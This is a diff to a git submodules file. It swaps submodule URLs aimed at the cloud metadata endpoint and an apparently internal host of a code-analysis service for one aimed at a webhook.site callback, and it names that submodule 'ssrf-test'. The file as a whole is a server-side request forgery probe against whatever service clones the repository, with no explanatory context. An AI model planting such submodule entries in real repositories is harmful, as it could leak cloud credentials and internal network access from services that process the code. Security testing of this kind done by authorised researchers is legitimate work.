@@ -1,9 +1,3 @@
-[submodule "test"]
-	path = test-module
-	url = https://169.254.169.254/latest/meta-data/
-	branch = main
-
-[submodule "internal-test"]
-	path = internal-test
-	url = https://internal.codacy.internal/submodule
-	branch = main
+[submodule "ssrf-test"]
+  path = ssrf-test
+  url = https://webhook.site/2caa5206-2135-4402-a5de-797ff032405c/git/test.git
